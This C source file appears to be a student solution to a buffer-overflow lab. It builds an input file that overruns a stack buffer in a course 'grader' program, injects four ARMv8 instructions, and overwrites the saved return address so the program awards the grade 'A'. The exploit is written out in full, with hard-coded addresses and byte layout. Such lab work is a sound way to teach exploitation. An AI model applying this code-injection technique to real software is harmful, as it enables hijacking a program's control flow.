/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/* Author: Tom Wang and Ty Lipscomb                                   */
/*--------------------------------------------------------------------*/

/* Produces a file called dataA with the student name, padding to
   align to 4 bytes, four ARMv8 machine-language instructions
   (adr, mov, strb, b) that store 'A' into the grade variable and
   then branch to main's "is your grade" printf, more padding to
   overrun the stack, and the address of the first injected
   instruction, which will overwrite getName's saved x30 so that
   getName returns into the injected code in the name array. */

#include <stdio.h>
#include "miniassembler.h"


/* Takes no command-line arguments. Reads nothing from stdin. Writes
   nothing to stdout or stderr. Writes bytes to a file named "dataA"
   that, when supplied as input to the grader program, will cause
   the grader to award a grade of A. Returns 0. */

int main(void) {
    int i;
    unsigned int uiInstr;
    
/*
adr  x0, 0x420044        x0 = address of `grade`
mov  w1, #0x41      w1 = 'A'
strb w1, [x0]        *grade = 'A'
b    0x40089c      jump to main+64 

|0x420044  |0x44    |grade      | from memorymap
|0x420058	|name[0 - 3]    | from mem oyrmap

printf("%c is your grade.\n", grade);
0x40089c <main+64>:  adrp    x0, 0x420000 <__libc_start_main@got.plt>

*/
    const unsigned long grade_addr = 0x420044UL; /* addr of grade above*/
    const unsigned long name_addr  = 0x420058UL; /* addr of name above*/
    const unsigned long printf_addr = 0x40089cUL; /* addr of printf */

    FILE *psFile;
    psFile = fopen("dataA", "w");

    /* The student name. These three bytes are read into buf[0..2]
       and later copied into the name array in the bss section so
       the grader prints "Thank you, Ty." */
    putc('T', psFile);
    putc('y', psFile);
    putc('\0', psFile);
    putc('\0', psFile);

    /* bytes 4-7 executing adr x0, 0x420044 moving grade address to x0 
    stores the instruction 4 bytes after name accordingly*/
    uiInstr = MiniAssembler_adr(0, grade_addr, name_addr + 4);
    fwrite(&uiInstr, sizeof(uiInstr), 1, psFile);

    /* bytes 8-11 executes mov w1, #0x41 which jsut stores the value for 'A' into w1*/
    uiInstr = MiniAssembler_mov(1, 0x41);
    fwrite(&uiInstr, sizeof(uiInstr), 1, psFile);

    /* Bytes 12-15 executes
    strb w1, [x0] whic store the byte 'A' at the address of grade */
    uiInstr = MiniAssembler_strb(1, 0);
    fwrite(&uiInstr, sizeof(uiInstr), 1, psFile);

    /* bytes 16-19 executes b 0x40089c which is the jump to the location of printf
    so that the grade prints "A is your grade." stores the insturction 16 bytes after name since this 
    is the 4th instruction
    */
    uiInstr = MiniAssembler_b(printf_addr, name_addr + 16);
    fwrite(&uiInstr, sizeof(uiInstr), 1, psFile);

    /* 28 null bytes. This acts as padding since the first 19 of the 18 store the name, null byte,
     and the 16 inctruction bytes. the rest is stored in name but too long for printf*/
    for (i = 0; i < 28; i++) {
        putc(0x00, psFile);
    }

    /* The 8 bytes that overwrite getName's saved x30 register.
       Written little-endian, these bytes form the address
       0x000000000042005C = name_addr + 4, the address of the
       first injected instruction (the adr) inside the name array.
       When getName executes its epilog and returns by branching
       to the (now overwritten) saved x30, control jumps into the
       injected shellcode, which sets grade to 'A' and branches
       into main's printf block, so the grader prints
       "A is your grade." */
    putc(0x5C, psFile);
    putc(0x00, psFile);
    putc(0x42, psFile);
    putc(0x00, psFile);
    putc(0x00, psFile);
    putc(0x00, psFile);
    putc(0x00, psFile);
    putc(0x00, psFile);

    return 0;
}
